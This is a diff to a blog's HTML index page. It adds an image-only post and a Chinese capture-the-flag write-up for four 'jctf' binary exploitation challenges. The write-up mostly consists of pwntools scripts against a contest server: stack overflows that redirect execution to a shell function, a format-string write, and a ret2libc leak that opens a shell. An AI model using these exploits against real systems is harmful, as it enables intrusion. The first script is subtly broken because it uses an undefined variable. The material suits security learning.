@@ -269,6 +269,62 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-heart" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/03/06/heart/" class="article-date">
+      <time datetime="2018-03-06T13:22:07.000Z" itemprop="datePublished">2018-03-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/03/06/heart/">heart</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><img src="/2018/03/06/heart/1.png" alt=""></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-jctf二进制方向" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -306,6 +362,8 @@
 <p>专业项目：</p>
 <h1 id="pwn1：简单的栈溢出"><a href="#pwn1：简单的栈溢出" class="headerlink" title="pwn1：简单的栈溢出"></a>pwn1：简单的栈溢出</h1><p>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br><br>将获得flag的地址直接覆盖在返回地址上<br><br>通过测试发现溢出为72位<br><br>直接覆盖获得flag<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># p = process(&quot;./1&quot;)</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;,&apos;18532&apos;)</span><br><span class="line">addr = 0x000000000040060D</span><br><span class="line">payload = &quot;A&quot;*72 + p64(ret_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvall()</span><br></pre></td></tr></table></figure></p>
 <h1 id="pwn2-函数跳转"><a href="#pwn2-函数跳转" class="headerlink" title="pwn2: 函数跳转"></a>pwn2: 函数跳转</h1><p>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br>溢出点经过测试为40<br><br>和第一题思路一样，但是覆盖的是获得shell的函数，通过这个函数我们使用cat flag获得flag<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line"># p = process(&quot;./2&quot;)</span><br><span class="line">get_shell = 0x000000000040078F</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;,&apos;58642&apos;)</span><br><span class="line">payload = &quot;a&quot;*40 + p64(get_shell)</span><br><span class="line">p.sendline(&quot;1&quot;)</span><br><span class="line">p.recvuntil(&quot;your name is:\n&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<h1 id="pwn3-格式化字符串"><a href="#pwn3-格式化字符串" class="headerlink" title="pwn3:格式化字符串"></a>pwn3:格式化字符串</h1><p>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">payload = &quot;\x30\xa0\x04\x08\x31\xa0\x04\x08\x32\xa0\x04\x08\x33\xa0\x04\x08%18x%12$n%17x%13$n%495x%14$n&quot;</span><br><span class="line"># p = process(&quot;./3&quot;)</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;, &apos;36731&apos;)</span><br><span class="line">#context.clear(arch = &apos;i386&apos;)</span><br><span class="line">#payload = repr(fmtstr_payload(12, &#123;0x0804a030: 0x02223322&#125;, write_size=&apos;byte&apos;))</span><br><span class="line">print payload</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print p.recvall()</span><br></pre></td></tr></table></figure></p>
+<p>#pwn4:内存泄漏的栈溢出<br>jctf{234dg5g5h5h5hy2h2h234rg34g34grg3}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line">elf = ELF(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line"># p = process(&apos;./4&apos;)</span><br><span class="line">p = remote(&apos;218.2.197.241&apos;, &apos;29663&apos;)</span><br><span class="line">#p = remote(&apos;127.0.0.1&apos;, 10003)</span><br><span class="line"></span><br><span class="line">plt_write = elf.symbols[&apos;write&apos;]</span><br><span class="line">print &apos;plt_write= &apos; + hex(plt_write)</span><br><span class="line">got_write = elf.got[&apos;write&apos;]</span><br><span class="line">print &apos;got_write= &apos; + hex(got_write)</span><br><span class="line">vulfun_addr = 0x08048474</span><br><span class="line">print &apos;vulfun= &apos; + hex(vulfun_addr)</span><br><span class="line"></span><br><span class="line">payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line">print &apos;write_addr=&apos; + hex(write_addr)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[&apos;write&apos;] - libc.symbols[&apos;system&apos;])</span><br><span class="line">print &apos;system_addr= &apos; + hex(system_addr)</span><br><span class="line">binsh_addr = write_addr - (libc.symbols[&apos;write&apos;] - next(libc.search(&apos;/bin/sh&apos;)))</span><br><span class="line">print &apos;binsh_addr= &apos; + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = &apos;a&apos;*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
